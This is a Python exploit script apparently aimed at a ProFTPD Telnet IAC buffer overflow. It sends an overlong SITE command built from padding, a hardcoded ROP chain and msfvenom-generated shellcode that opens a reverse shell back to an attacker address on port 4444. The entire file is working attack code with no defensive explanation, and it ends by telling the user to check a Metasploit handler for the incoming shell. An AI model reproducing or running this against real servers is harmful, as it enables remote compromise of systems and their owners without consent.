#!/usr/bin/python
## 
## Usage: python pro-ftpd-iac.py <Remote IP Address>

import sys,os,socket
import struct

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.232 LPORT=4444 CMD=/bin/sh PrependChrootBreak=true --smallest -f python -v payload -b '\x09\x0a\x0b\x0c\x0d\x20'
payload =  ""
payload += "\x6a\x1d\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73"
payload += "\x13\x34\xaf\x42\xaa\x83\xeb\xfc\xe2\xf4\x05\x66"
payload += "\x73\x71\x5e\xe9\x1a\x67\xb4\xc5\x7f\x23\xd7\xc5"
payload += "\x65\xf2\xf9\x2f\xcb\x73\x6c\x62\xc2\x9b\xf4\xff"
payload += "\x24\xc2\x1a\x81\xcb\x49\x5e\x92\x1b\x1a\x38\x62"
payload += "\xc2\x48\xce\xc5\x7f\x23\xed\xf7\x8f\x2a\x05\x74"
payload += "\xb5\x49\x67\xec\x11\xc0\x36\x26\xa3\x1a\x52\x62"
payload += "\xc2\x39\x6d\x1f\x7d\x67\xb4\xe6\x3b\x53\x5c\xa5"
payload += "\x49\xaa\xdc\xc7\x40\xaa\x25\xf3\xcb\x4b\x84\xc9"
payload += "\x12\xfb\x67\x1c\x41\x23\xd5\x62\xc2\xf8\x5c\xc1"
payload += "\x6d\xd9\x5c\xc7\x6d\x85\x56\xc6\xcb\x49\x66\xfc"
payload += "\xcb\x4b\x84\xa4\x8f\x2a"

IACCount = 4096+16
Offset = 0x102c-4
Ret = "0x805a547" 	
Writable = "0x80e81a0" 

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    sys.exit()

rop = struct.pack("<L",0xcccccccc) 
rop += struct.pack("<L",0x805a544)  
rop += struct.pack("<L",0xcccccccc) 
rop += struct.pack("<L",0xcccccccc) 
rop += struct.pack("<L",0xcccccccc) 
rop += struct.pack("<L",0x8068886) 
rop += struct.pack("<L",0x8068886)  
rop += struct.pack("<L",0x8068886) 
rop += struct.pack("<L",0x8068886)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e) 
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e) 
rop += struct.pack("<L",0x805bd8e) 
rop += struct.pack("<L",0x805bd8e) 
rop += struct.pack("<L",0x805bd8e) 
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x805bd8e)  
rop += struct.pack("<L",0x0805c26c) 

buf = ''
buf += 'SITE '

buf += payload
if len(buf) % 2 == 0:
	buf += "B" 	
        print "Buffer was aligned"

buf += "\xff" * (IACCount - len(payload))
buf +="\x90" * (Offset - len(buf))
addrs = struct.pack('<L',0x805a547) 
addrs +=struct.pack('<L',0x80e81a0) 
addrs +=rop
buf += addrs
buf += "\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 21))
s.recv(1024)
s.send(buf)
print "Payload Successfully Send...Check your Multi/Handler"
print "....Reverse shell is comming to you..."

data=s.recv(1024)
print data
s.close()
